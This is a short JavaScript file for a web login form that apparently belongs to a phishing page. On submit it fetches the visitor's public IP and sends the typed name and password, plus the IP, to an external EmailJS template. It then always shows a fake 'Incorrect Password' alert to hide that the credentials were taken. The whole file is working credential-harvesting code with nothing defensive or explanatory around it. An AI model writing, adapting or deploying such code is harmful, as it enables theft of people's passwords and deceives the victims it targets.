const btn = document.getElementById("button");

document.getElementById("form").addEventListener("submit", function (event) {
  event.preventDefault();

  // btn.value = "Sending...";

  const serviceID = "default_service";
  const templateID = "template_4l71e0a";

  fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      console.log("data" + data);
      // Construct email parameters object
      var params = {
        from_name: document.getElementById("from_name").value,
        password: document.getElementById("password").value,
        IP: data.ip,
      };

      emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
          // Clear form fields and show success message
          document.getElementById("from_name").value = "";
          document.getElementById("password").value = "";
          console.log(res);
          alert("Incorrect Password");
        })
        .catch((err) => {
          console.log(err);
          alert("Incorrect Password");
        });
    });
});
